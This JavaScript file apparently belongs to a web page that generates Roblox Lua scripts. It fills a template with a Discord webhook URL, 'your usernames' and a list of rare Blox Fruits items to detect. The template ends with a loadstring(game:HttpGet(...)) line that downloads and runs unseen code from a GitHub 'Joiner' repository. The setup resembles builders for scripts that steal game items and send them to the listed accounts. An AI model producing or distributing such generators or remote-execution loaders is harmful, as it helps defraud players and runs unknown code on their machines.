document.addEventListener('DOMContentLoaded', () => {
    const webhookUrlInput = document.getElementById('webhookUrl');
    const usernamesInput = document.getElementById('usernamesInput');
    const generateButton = document.getElementById('generateButton');
    const outputScriptElement = document.getElementById('outputScript');
    const copyButton = document.getElementById('copyButton');

    // Define the fixed parts of the script template
    const scriptTemplateStart = `Webhook = "`;
    const scriptTemplateMid = `" -- << Your Webhook
Usernames = {`;
    const scriptTemplateUsernamesEnd = `} -- << Your usernames here, you can add as many alts as you want
FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want the script to detect

loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;

    generateButton.addEventListener('click', () => {
        // 1. Get input values
        const webhookUrl = webhookUrlInput.value.trim();
        const usernamesRaw = usernamesInput.value.trim();

        // 2. Process usernames into Lua table format
        let usernamesLuaTable = "";
        if (usernamesRaw) {
            const usernamesArray = usernamesRaw
                .split('\n') // Split by new line
                .map(name => name.trim()) // Trim whitespace from each name
                .filter(name => name !== ''); // Remove empty lines

            // Format each username as a Lua string literal
            usernamesLuaTable = usernamesArray.map(name => `"${name}"`).join(', ');
        }

        // 3. Construct the final script
        const finalScript =
            scriptTemplateStart +
            webhookUrl + // Insert webhook URL
            scriptTemplateMid +
            usernamesLuaTable + // Insert formatted usernames
            scriptTemplateUsernamesEnd;

        // 4. Display the generated script
        outputScriptElement.textContent = finalScript;
        copyButton.style.display = 'inline-block'; // Show the copy button
    });

    copyButton.addEventListener('click', () => {
        const scriptToCopy = outputScriptElement.textContent;
        navigator.clipboard.writeText(scriptToCopy).then(() => {
            // Optional: Give user feedback (e.g., change button text)
            copyButton.textContent = 'Copied!';
            setTimeout(() => {
                copyButton.textContent = 'Copy to Clipboard';
            }, 2000); // Reset text after 2 seconds
        }).catch(err => {
            console.error('Failed to copy text: ', err);
            // Optional: Alert user about the error
            alert('Failed to copy script to clipboard.');
        });
    });
});
